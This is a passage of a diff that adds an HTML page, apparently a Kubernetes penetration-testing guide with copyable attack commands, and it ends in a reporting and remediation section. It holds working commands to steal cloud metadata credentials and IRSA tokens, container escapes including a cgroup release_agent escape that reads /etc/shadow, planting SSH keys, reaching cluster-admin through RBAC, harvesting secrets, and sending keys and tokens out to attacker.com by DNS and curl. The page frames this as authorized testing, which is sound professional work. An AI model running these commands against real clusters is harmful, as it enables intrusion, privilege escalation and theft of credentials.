+          <tr><td><code>CVE-2023-5043</code></td><td>Annotation injection via <code>nginx.ingress.kubernetes.io/configuration-snippet</code></td><td><span class="risk risk-h">7.6</span></td><td>Credential theft from requests</td></tr>
+          <tr><td><code>CVE-2023-5044</code></td><td>Code injection via <code>nginx.ingress.kubernetes.io/permanent-redirect</code></td><td><span class="risk risk-h">7.6</span></td><td>Internal service redirect abuse</td></tr>
+          <tr><td><code>CVE-2025-1097,1098,1974,24514</code></td><td>"IngressNightmare" — unauthenticated RCE via AdmissionController</td><td><span class="risk risk-c">9.8</span></td><td>Full cluster compromise</td></tr>
+        </table>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">INGRESSNIGHTMARE (CVE-2025-1974) FINGERPRINT</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Check ingress-nginx version</span>
+kubectl -n ingress-nginx get pod -o yaml | grep "image:"
+kubectl -n ingress-nginx exec -it INGRESS_POD -- nginx -v
+
+<span class="c"># Affected: ingress-nginx &lt; 1.11.5 / 1.12.1</span>
+<span class="c"># Check if admission webhook is exposed externally (port 8443)</span>
+kubectl get validatingwebhookconfiguration ingress-nginx-admission -o yaml</pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">SSRF to Internal Services via Ingress</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">SSRF TARGETING K8S INTERNAL SERVICES</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># If app has SSRF — target internal k8s API server</span>
+<span class="c"># Internal k8s API server address from pod perspective</span>
+https://kubernetes.default.svc.cluster.local
+
+<span class="c"># Target etcd via SSRF</span>
+http://etcd.kube-system.svc.cluster.local:2379
+
+<span class="c"># Target Kubelet read-only via SSRF</span>
+http://NODE_IP:10255/pods
+
+<span class="c"># SSRF to cloud metadata (AWS)</span>
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+<span class="c"># SSRF to cloud metadata (GCP)</span>
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+<span class="c"># Header required: Metadata-Flavor: Google</span>
+
+<span class="c"># SSRF to cloud metadata (Azure)</span>
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/</pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">NodePort Service Enumeration</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">NODEPORT SCANNING</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Scan NodePort range across all worker nodes</span>
+nmap -p 30000-32767 --open -sV NODE_IP_1 NODE_IP_2 NODE_IP_3
+
+<span class="c"># Identify what services are exposed</span>
+<span class="c"># Cross-reference with kubectl get svc --all-namespaces</span>
+
+<span class="c"># Check for databases exposed via NodePort (critical finding)</span>
+<span class="c"># Common: Redis :6379, MongoDB :27017, MySQL :3306 exposed on NodePorts</span></pre>
+        </div>
+      </div>
+
+      <div class="notes-label">// INGRESS/SERVICE FINDINGS</div>
+      <textarea class="notes-area" id="notes-s9" placeholder="Ingress version, CVE applicability, SSRF vectors, NodePort services found..." oninput="saveNote('s9',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 10: CLOUD METADATA -->
+  <!-- ============================================================ -->
+  <div class="section" id="s10">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">10</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Cloud Metadata &amp; IRSA Abuse</div>
+        <div class="section-sub">AWS/GCP/Azure Metadata · IRSA · Workload Identity · Node IAM Role</div>
+      </div>
+      <span class="section-badge badge-exploit">EXPLOITATION</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">Managed Kubernetes clusters (EKS, GKE, AKS) run on cloud VMs. From a compromised pod, the cloud metadata service is reachable unless explicitly blocked. Node IAM roles often have excessive cloud permissions.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">AWS IMDSv1/v2 from Pod</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">AWS METADATA ABUSE (EKS)</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># IMDSv1 (no token required — critical if reachable)</span>
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+<span class="c"># Returns role name — then:</span>
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+<span class="c"># Returns: AccessKeyId, SecretAccessKey, Token — use to access AWS APIs</span>
+
+<span class="c"># IMDSv2 (requires token — harder but possible)</span>
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+<span class="c"># With stolen creds — enumerate AWS permissions</span>
+aws sts get-caller-identity
+aws iam list-attached-role-policies --role-name ROLE_NAME
+aws s3 ls  <span class="c"># Often node role has S3 read access</span>
+aws eks list-clusters  <span class="c"># May allow cluster takeover</span></pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">IRSA / Workload Identity Token Abuse</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">IRSA TOKEN EXTRACTION (EKS)</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># IRSA tokens are projected volumes — check if pod has one</span>
+ls /var/run/secrets/eks.amazonaws.com/serviceaccount/
+cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token
+
+<span class="c"># Use token to assume IAM role</span>
+WEB_IDENTITY_TOKEN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
+ROLE_ARN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/...)
+
+aws sts assume-role-with-web-identity \
+  --role-arn $ROLE_ARN \
+  --role-session-name pwned \
+  --web-identity-token $WEB_IDENTITY_TOKEN
+
+<span class="c"># GCP Workload Identity</span>
+curl -H "Metadata-Flavor: Google" \
+  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+<span class="c"># AKS — Azure Instance Metadata</span>
+curl -H Metadata:true \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"</pre>
+        </div>
+      </div>
+
+      <div class="notes-label">// CLOUD METADATA FINDINGS</div>
+      <textarea class="notes-area" id="notes-s10" placeholder="Cloud provider, IMDSv1 accessible, IAM role permissions found..." oninput="saveNote('s10',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 11: CONTAINER ESCAPE -->
+  <!-- ============================================================ -->
+  <div class="section" id="s11">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">11</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Container Escape</div>
+        <div class="section-sub">Privileged Containers · hostPath · CAP_SYS_ADMIN · runc CVEs</div>
+      </div>
+      <span class="section-badge badge-crit">CRITICAL PATH</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">Container escape moves from pod compromise to full host node compromise. From a node, all pods on that node are accessible, kubelet credentials are readable, and cloud IAM roles can be stolen.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">Privileged Container Escape</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">ESCAPE VIA PRIVILEGED CONTAINER</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Check if container is privileged</span>
+cat /proc/1/status | grep Cap
+capsh --decode=&lt;hex_value&gt;  <span class="c"># eff caps should be all-1s in privileged mode</span>
+
+<span class="c"># Method 1: Mount host filesystem via /proc</span>
+nsenter --mount=/proc/1/ns/mnt -- /bin/bash
+<span class="c"># Now inside host namespace</span>
+
+<span class="c"># Method 2: Mount host root via device</span>
+ls /dev/sda*  <span class="c"># or /dev/nvme0n1p1 on AWS</span>
+mkdir /tmp/host-root
+mount /dev/sda1 /tmp/host-root
+chroot /tmp/host-root /bin/bash
+
+<span class="c"># Method 3: cgroup release_agent (classic privileged escape)</span>
+mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
+mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "cat /etc/shadow > $host_path/output" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+cat /output</pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">hostPath Mount Escape</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">HOSTPATH ABUSE</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># If pod has hostPath mount — read sensitive host files</span>
+<span class="c"># Check mounts inside container</span>
+mount | grep -v cgroup | grep -v proc | grep -v tmpfs
+
+<span class="c"># If / is mounted — full host access</span>
+ls /host-root/etc/kubernetes/pki/
+cat /host-root/etc/kubernetes/admin.conf  <span class="c"># cluster-admin kubeconfig</span>
+cat /host-root/var/lib/kubelet/config.yaml
+
+<span class="c"># Read node's kubelet bootstrap token</span>
+cat /host-root/etc/kubernetes/bootstrap-kubelet.conf
+
+<span class="c"># Write SSH key to host (if / mounted writable)</span>
+mkdir -p /host-root/root/.ssh
+echo "ssh-rsa YOUR_PUBKEY" >> /host-root/root/.ssh/authorized_keys</pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Notable Container Escape CVEs</div>
+        <div class="tbl-wrap">
+        <table>
+          <tr><th>CVE</th><th>Description</th><th>CVSS</th><th>Affected</th></tr>
+          <tr><td><code>CVE-2019-5736</code></td><td>runc container escape — overwrite host runc binary via /proc/self/exe</td><td><span class="risk risk-c">8.6</span></td><td>runc &lt; 1.0-rc6; Docker &lt; 18.09.2</td></tr>
+          <tr><td><code>CVE-2020-15257</code></td><td>containerd escape via abstract Unix socket — accessible from container</td><td><span class="risk risk-h">7.8</span></td><td>containerd &lt; 1.3.9, &lt; 1.4.3</td></tr>
+          <tr><td><code>CVE-2022-0811</code></td><td>CRI-O "cr8escape" — sysctl parameter injection to escape container</td><td><span class="risk risk-c">8.8</span></td><td>CRI-O 1.19+</td></tr>
+          <tr><td><code>CVE-2022-23648</code></td><td>containerd — malicious OCI image can access host paths</td><td><span class="risk risk-m">6.2</span></td><td>containerd &lt; 1.4.13, &lt; 1.5.10</td></tr>
+        </table>
+        </div>
+      </div>
+
+      <div class="notes-label">// CONTAINER ESCAPE FINDINGS</div>
+      <textarea class="notes-area" id="notes-s11" placeholder="Container runtime, privileged status, hostPath mounts, successful escape method..." oninput="saveNote('s11',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 12: PRIVILEGE ESCALATION -->
+  <!-- ============================================================ -->
+  <div class="section" id="s12">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">12</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Privilege Escalation</div>
+        <div class="section-sub">RBAC Misconfig · Impersonation · Rolebinding Creation · SA Token Abuse</div>
+      </div>
+      <span class="section-badge badge-crit">CRITICAL PATH</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">Within a cluster, privilege escalation typically means reaching cluster-admin from a low-privilege service account. RBAC misconfigurations are the most common path.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">RBAC Privilege Escalation Paths</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">RBAC PRIVESC TECHNIQUES</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># If SA can create/patch ClusterRoleBindings — instant cluster-admin</span>
+kubectl create clusterrolebinding pwned \
+  --clusterrole=cluster-admin \
+  --serviceaccount=NAMESPACE:SA_NAME
+
+<span class="c"># If SA can impersonate — impersonate cluster-admin</span>
+kubectl --as=system:serviceaccount:kube-system:default \
+  get secrets -n kube-system
+
+<span class="c"># If SA can create pods — deploy privileged pod for node escape</span>
+kubectl apply -f - &lt;&lt;EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+  namespace: NAMESPACE
+spec:
+  hostPID: true
+  hostNetwork: true
+  containers:
+  - name: privesc
+    image: alpine
+    command: ["nsenter", "--mount=/proc/1/ns/mnt", "--", "/bin/bash"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: host
+      mountPath: /host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+EOF
+
+<span class="c"># If SA can get secrets — read kube-system SA tokens</span>
+kubectl get secret -n kube-system | grep "token"
+kubectl get secret TOKENNAME -n kube-system -o jsonpath='{.data.token}' | base64 -d</pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Automated RBAC Escalation Tools</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">PEIRATES / RBAC-POLICE</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Peirates — K8s attack toolkit</span>
+peirates
+<span class="c"># Interactive menu: SA token harvest, cloud metadata, pod exec, privesc</span>
+
+<span class="c"># rbac-police — find RBAC policies that allow privilege escalation</span>
+rbac-police eval lib/targeted.rego
+
+<span class="c"># kubectl-explore / audit2rbac analysis</span>
+kubectl get clusterroles -o json | \
+  python3 -c "
+import json,sys
+data=json.load(sys.stdin)
+for r in data['items']:
+  for rule in r.get('rules',[]):
+    if '*' in rule.get('verbs',[]) or \
+       'create' in rule.get('verbs',[]) and \
+       'clusterrolebindings' in rule.get('resources',[]):
+      print(r['metadata']['name'],rule)
+"</pre>
+        </div>
+      </div>
+
+      <div class="notes-label">// PRIVESC FINDINGS</div>
+      <textarea class="notes-area" id="notes-s12" placeholder="SA name, starting permissions, escalation path, resulting permissions..." oninput="saveNote('s12',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 13: LATERAL MOVEMENT -->
+  <!-- ============================================================ -->
+  <div class="section" id="s13">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">13</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Lateral Movement</div>
+        <div class="section-sub">East-West Traffic · Service Discovery · DNS Enumeration · Pod Hopping</div>
+      </div>
+      <span class="section-badge badge-post">POST-EXPLOIT</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">From a foothold pod, enumerate the cluster's internal network. Kubernetes DNS makes service discovery trivial. Without NetworkPolicy, all pods can reach all services by default.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">Internal Service Discovery</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">SERVICE &amp; DNS ENUMERATION FROM POD</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Kubernetes DNS — resolve services</span>
+<span class="c"># Format: service.namespace.svc.cluster.local</span>
+
+cat /etc/resolv.conf  <span class="c"># Shows cluster DNS server</span>
+
+<span class="c"># Enumerate all services via DNS brute-force</span>
+<span class="c"># Or use environment variables injected into pod</span>
+env | grep -E "_SERVICE_HOST|_SERVICE_PORT"
+
+<span class="c"># Direct API enumeration (with SA token)</span>
+curl -sk https://kubernetes.default.svc/api/v1/services \
+  -H "Authorization: Bearer $TOKEN" | jq '.items[].metadata | {name,namespace}'
+
+<span class="c"># Network scan from pod (if nmap available)</span>
+nmap -sV -p 80,443,3306,5432,6379,8080,8443,9200 \
+  10.0.0.0/16 --open -T4 -oA internal_scan
+
+<span class="c"># Quick bash port scanner (no tools needed)</span>
+for host in $(seq 1 254); do
+  for port in 80 443 3306 5432 6379 8080 27017; do
+    (echo >/dev/tcp/10.0.0.$host/$port) 2>/dev/null && \
+    echo "OPEN: 10.0.0.$host:$port"
+  done
+done</pre>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Harvesting Credentials from Pods</div>
+        <div class="cmd-block">
+          <div class="cmd-header"><span class="cmd-label">CREDENTIAL HARVEST VIA API</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># Read all secrets across namespaces (if permitted)</span>
+kubectl get secrets --all-namespaces -o json | \
+  jq '.items[] | {ns:.metadata.namespace, name:.metadata.name, \
+  data:.data | with_entries(.value |= @base64d)}'
+
+<span class="c"># Read environment variables from running pods (via exec)</span>
+for pod in $(kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name} '); do
+  echo "=== $pod ===" 
+  kubectl exec -n $(echo $pod | cut -d/ -f1) $(echo $pod | cut -d/ -f2) -- env 2>/dev/null | \
+    grep -Ei "pass|secret|key|token|api|db" 
+done
+
+<span class="c"># Read ConfigMaps (may contain plaintext credentials)</span>
+kubectl get configmaps --all-namespaces -o json | \
+  jq '.items[] | select(.data | to_entries[] | .value | test("pass|secret|token";"i"))'</pre>
+        </div>
+      </div>
+
+      <div class="notes-label">// LATERAL MOVEMENT FINDINGS</div>
+      <textarea class="notes-area" id="notes-s13" placeholder="Internal services reached, credentials harvested (categories only), namespace access achieved..." oninput="saveNote('s13',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 14: PERSISTENCE -->
+  <!-- ============================================================ -->
+  <div class="section" id="s14">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">14</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Persistence Techniques</div>
+        <div class="section-sub">Backdoor SAs · DaemonSets · Webhook Abuse · CronJobs</div>
+      </div>
+      <span class="section-badge badge-post">POST-EXPLOIT</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">Document persistence paths for the report. Only simulate — do not actually establish persistence in production environments without explicit written authorization.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">Kubernetes Persistence Methods</div>
+        <div class="tbl-wrap">
+        <table>
+          <tr><th>Technique</th><th>MITRE ID</th><th>Description</th><th>Stealth</th></tr>
+          <tr><td>Backdoor ServiceAccount + ClusterRoleBinding</td><td>T1136.001</td><td>Create SA with cluster-admin binding; token survives pod deletion</td><td><span class="risk risk-m">MED</span></td></tr>
+          <tr><td>DaemonSet on all nodes</td><td>T1053</td><td>Ensure pod runs on every node including future ones; survives node replacement</td><td><span class="risk risk-l">LOW</span></td></tr>
+          <tr><td>Mutating Webhook</td><td>T1574</td><td>Register webhook to inject sidecar into every new pod — silent persistence</td><td><span class="risk risk-h">HIGH</span></td></tr>
+          <tr><td>CronJob</td><td>T1053.007</td><td>K8s CronJob periodically calls back to C2; auto-restarts</td><td><span class="risk risk-m">MED</span></td></tr>
+          <tr><td>Supply Chain: Image in Registry</td><td>T1195.002</td><td>Push backdoored image to internal registry; waits for deployment</td><td><span class="risk risk-h">HIGH</span></td></tr>
+          <tr><td>Static Pod on Node</td><td>T1543</td><td>Write pod manifest to /etc/kubernetes/manifests/ on node — kubelet auto-starts it</td><td><span class="risk risk-l">LOW</span></td></tr>
+        </table>
+        </div>
+        <div class="callout warn">
+          <span class="callout-icon">⚠</span>
+          <div><strong>Authorization required:</strong> Demonstrating persistence in production clusters requires explicit written authorization. Default engagement scope should only document the path — not execute it. Confirm with client before proceeding.</div>
+        </div>
+      </div>
+
+      <div class="notes-label">// PERSISTENCE NOTES</div>
+      <textarea class="notes-area" id="notes-s14" placeholder="Authorized persistence techniques simulated, evidence screenshots..." oninput="saveNote('s14',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 15: EXFILTRATION -->
+  <!-- ============================================================ -->
+  <div class="section" id="s15">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">15</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Data Exfiltration &amp; Impact Demonstration</div>
+        <div class="section-sub">Secret Exfil · Volume Data · Cloud Storage · DNS Exfil</div>
+      </div>
+      <span class="section-badge badge-post">POST-EXPLOIT</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">Demonstrate the blast radius of the compromise. Focus on showing what data is accessible and how it could be exfiltrated — use placeholder/test data only unless specifically authorized to handle production data.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">High-Value Data Targets in K8s</div>
+        <ul class="checklist">
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Kubernetes Secrets</strong> — database passwords, API keys, TLS private keys, OAuth tokens</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>etcd dump</strong> — entire cluster state; service account signing key allows forging any token</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Persistent Volumes</strong> — may contain database files, file uploads, backups</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Cloud credentials via metadata</strong> — IRSA/Workload Identity tokens for AWS/GCP/Azure APIs</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Container image layers</strong> — Dockerfiles may have baked-in credentials; <code>docker history</code> reveals ENV at build time</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Git credentials</strong> — ArgoCD/FluxCD SSH deploy keys or HTTPS tokens stored as Secrets</div></li>
+        </ul>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Exfiltration Channels (for PoC documentation)</div>
+        <div class="cmd-block info-block">
+          <div class="cmd-header"><span class="cmd-label">EXFIL PATHS (AUTHORIZED PoC ONLY)</span><button class="copy-btn" onclick="copyCmd(this)">COPY</button></div>
+          <pre><span class="c"># DNS exfiltration (bypasses egress firewall)</span>
+<span class="c"># Requires authorised external listener: nc -u -l 53</span>
+data=$(cat /etc/kubernetes/pki/ca.key | base64 | tr -d '\n')
+for chunk in $(echo $data | fold -w 60); do
+  nslookup "${chunk}.exfil.attacker.com"
+done
+
+<span class="c"># HTTPS exfil via curl (if egress allowed)</span>
+curl -sk https://attacker.com/collect \
+  -d "data=$(base64 /run/secrets/kubernetes.io/serviceaccount/token)"
+
+<span class="c"># Via cloud storage (if cloud creds obtained)</span>
+aws s3 cp /path/to/data s3://attacker-bucket/
+
+<span class="c"># Demonstrate impact: show what's accessible, screenshot/document</span>
+<span class="c"># DO NOT exfiltrate real production data without explicit written auth</span></pre>
+        </div>
+      </div>
+
+      <div class="notes-label">// EXFILTRATION FINDINGS</div>
+      <textarea class="notes-area" id="notes-s15" placeholder="Data categories accessible, egress paths available, blast radius summary..." oninput="saveNote('s15',this.value)"></textarea>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <!-- SECTION 16: REPORTING -->
+  <!-- ============================================================ -->
+  <div class="section" id="s16">
+    <div class="section-header" onclick="toggleSection(this)">
+      <span class="section-num">16</span>
+      <div class="section-title-wrap">
+        <div class="section-title">Documentation &amp; Reporting</div>
+        <div class="section-sub">Evidence Collection · Findings Template · Remediation Guidance</div>
+      </div>
+      <span class="section-badge badge-scope">REPORTING</span>
+      <span class="chevron">▶</span>
+    </div>
+    <div class="section-body">
+      <div class="phase-intro">A penetration test is only as valuable as the report it produces. K8s reports must map findings to concrete business risk and provide actionable, version-specific remediation steps.</div>
+
+      <div class="subsection">
+        <div class="subsection-title">Evidence Collection During Testing</div>
+        <ul class="checklist">
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Timestamped screenshots</strong> for every critical finding — include terminal output, API responses, and cluster name/version visible</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Full HTTP request/response</strong> for web-layer findings — Burp Suite exports or curl -v output</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Kubernetes API server version</strong> (<code>/version</code> endpoint) for CVE applicability</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>RBAC policy YAML excerpts</strong> — export the exact ClusterRole/RoleBinding showing the misconfiguration</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Pod security context YAML</strong> — show <code>privileged: true</code>, <code>hostPath</code>, missing <code>securityContext</code></div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Network access proof</strong> — traceroute / curl showing external reachability of internal services</div></li>
+        </ul>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Finding Severity Classification</div>
+        <div class="tbl-wrap">
+        <table>
+          <tr><th>Severity</th><th>CVSS Range</th><th>K8s Examples</th><th>Response SLA</th></tr>
+          <tr><td><span class="risk risk-c">CRITICAL</span></td><td>9.0–10.0</td><td>Unauthenticated API server, etcd exposure, anonymous exec, IngressNightmare</td><td>Immediate (&lt;24h patch)</td></tr>
+          <tr><td><span class="risk risk-h">HIGH</span></td><td>7.0–8.9</td><td>Privileged pods, cluster-admin SA, Kubelet exec, leaked kubeconfig</td><td>&lt;7 days</td></tr>
+          <tr><td><span class="risk risk-m">MEDIUM</span></td><td>4.0–6.9</td><td>RBAC over-permission, read-only Kubelet, default credentials on UI, IMDSv1 accessible</td><td>&lt;30 days</td></tr>
+          <tr><td><span class="risk risk-l">LOW</span></td><td>0.1–3.9</td><td>Version disclosure, missing NetworkPolicy, verbose error messages</td><td>&lt;90 days</td></tr>
+        </table>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Key Remediation References</div>
+        <ul class="checklist">
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>CIS Kubernetes Benchmark</strong> — Center for Internet Security hardening checklist; version-specific</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>NSA/CISA Kubernetes Hardening Guide</strong> — detailed controls for pod security, RBAC, network policy</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Pod Security Standards</strong> — enforce <code>restricted</code> or <code>baseline</code> PSS at namespace level</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Encryption at Rest for Secrets</strong> — configure <code>EncryptionConfiguration</code> with AES-CBC or KMS provider</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Network Policy</strong> — implement deny-all default + explicit allow rules per workload</div></li>
+          <li class="check-item" onclick="toggleCheck(this)"><span class="check-box"></span><div class="check-text"><strong>Audit Logging</strong> — enable API server audit log; alert on <code>get secrets</code>, <code>exec</code>, and ClusterRoleBinding creation</div></li>
+        </ul>
+      </div>
+
+      <div class="notes-label">// REPORT NOTES / EXECUTIVE SUMMARY DRAFT</div>
+      <textarea class="notes-area" id="notes-s16" placeholder="Total findings count by severity, highest impact chain, key recommendations..." oninput="saveNote('s16',this.value)" style="min-height:120px"></textarea>
+    </div>
+  </div>
+
+  <footer>
+    <span>// External Kubernetes Penetration Testing Guide · For authorized security assessment use only · MITRE ATT&CK for Containers · CIS K8s Benchmark · NIST SP 800-115</span>
+  </footer>
+</main>
+</div>
+
+<script>
+  // ── Storage helpers ──
+  function saveNote(id, val) {
+    try { localStorage.setItem('k8s_note_' + id, val); } catch(e) {}
+  }
+  function loadNotes() {
+    document.querySelectorAll('.notes-area').forEach(ta => {
+      const id = ta.id.replace('notes-', '');
+      try {
+        const v = localStorage.getItem('k8s_note_' + id);
+        if (v) ta.value = v;
+      } catch(e) {}
+    });
+  }
+
+  // ── Checkbox persistence ──
+  function toggleCheck(el) {
+    el.classList.toggle('checked');
+    const box = el.querySelector('.check-box');
+    box.textContent = el.classList.contains('checked') ? '✓' : '';
+    saveChecks();
+    updateProgress();
+  }
+  function saveChecks() {
+    const state = {};
+    document.querySelectorAll('.check-item').forEach((el, i) => {
+      state[i] = el.classList.contains('checked');
+    });
+    try { localStorage.setItem('k8s_checks', JSON.stringify(state)); } catch(e) {}
+  }
+  function loadChecks() {
+    try {
+      const state = JSON.parse(localStorage.getItem('k8s_checks') || '{}');
+      document.querySelectorAll('.check-item').forEach((el, i) => {
+        if (state[i]) {
+          el.classList.add('checked');
+          el.querySelector('.check-box').textContent = '✓';
+        }
+      });
+    } catch(e) {}
+    updateProgress();
+  }
+
+  // ── Progress ──
+  function updateProgress() {
+    const all = document.querySelectorAll('.check-item').length;
+    const done = document.querySelectorAll('.check-item.checked').length;
+    const pct = all ? Math.round((done / all) * 100) : 0;
+    document.getElementById('progressFill').style.width = pct + '%';
+    document.getElementById('progressPct').textContent = pct + '%';
+  }
+
+  // ── Section toggle ──
+  function toggleSection(header) {
+    header.parentElement.classList.toggle('open');
+  }
+  function expandAll() {
+    document.querySelectorAll('.section').forEach(s => s.classList.add('open'));
+  }
+  function collapseAll() {
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('open'));
+  }
+
+  // ── Check / clear ──
+  function checkAll() {
+    document.querySelectorAll('.check-item').forEach(el => {
+      el.classList.add('checked');
+      el.querySelector('.check-box').textContent = '✓';
+    });
+    saveChecks(); updateProgress();
+  }
+  let clearPending = false;
+  let clearTimer = null;
+  function clearAll() {
